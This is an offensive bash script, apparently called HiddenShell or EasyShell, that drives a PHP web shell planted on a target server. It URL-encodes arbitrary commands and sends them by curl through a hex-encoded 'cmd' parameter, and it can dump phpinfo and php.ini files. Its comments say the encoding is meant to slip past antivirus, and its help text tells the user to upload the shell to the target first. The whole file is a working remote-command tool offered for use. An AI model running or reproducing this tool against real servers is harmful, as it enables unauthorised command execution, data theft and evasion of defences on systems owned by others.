#!/bin/bash
# PHP shell automation HiddenShell v2

abort() {
    echo -e "$1"
    exit 1
}

# Function for URL encoding
url_encode() {
    local data="$1"
    local length=${#data}
    local result=""

    for ((i = 0; i < length; i++)); do
        local c="${data:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) result+="$c" ;;
            *) result+="%$(printf "%02X" "'$c")" ;;
        esac
    done

    echo -n "$result"
}

# Function to extract response instead of entire page
extract_pre_tags() {
    sed -n '/<pre>/,/<\/pre>/p'
}

# Display how to use the script
display_help() {
    echo "Usage: $0 [options] <command> <URL>"
    echo "Options:"
    echo "  -v                  Verbose mode"
    echo "  --cookies           Enable cookies"
    echo "  --phpinfo           Show PHP information"
    echo "  --phpini <file>     Read a specific php.ini file"
    echo "  --help              Display this help message"
    echo "Command: The command to execute on the target system (if not using --phpinfo or --phpini)."
    echo "URL: The URL of the PHP shell script on the target machine."
    echo "Note: You need to upload the PHP shell script to the target machine first."
    echo "EasyShell php By: Jerr"
    exit 0
}

if [ "$1" == "--help" ]; then
    display_help
fi

[ -z "$1" ] && abort "[!] Missing Command"

[ -z "$2" ] && abort "[!] Missing URL"


case "$1" in
    --cookies)
        COOKIES="-b cookies.txt"
        shift
        ;;
    --phpinfo)
        CMD="phpinfo"
        shift
        ;;
    --phpini)
        CMD="phpini $2"
        shift 2
        ;;
    *)
        CMD=$(url_encode "$1")
        ;;
esac

URL="$2"  # Get the URL from the second argument


# Encoded parameters against AV
if [ "$CMD" == "phpinfo" ]; then
    TARGET_URL="$URL?\x70\x68\x70\x69\x6e\x66\x6f=1"
elif [ "$CMD" == "phpini" ]; then
    TARGET_URL="$URL?\x70\x68\x70\x69\x6e\x69=$2"
else
    TARGET_URL="$URL?\x63\x6d\x64=$CMD"
fi


# Error handling for 'curl' command
response=$(curl $COOKIES -L -X GET "$TARGET_URL" 2>&1)

# Extract text between <pre> tags using sed
filtered_response=$(echo "$response" | extract_pre_tags)

if [ -n "$filtered_response" ]; then
    echo "$filtered_response"
else
    abort "[!] Error executing 'curl' command or no valid response received."
fi
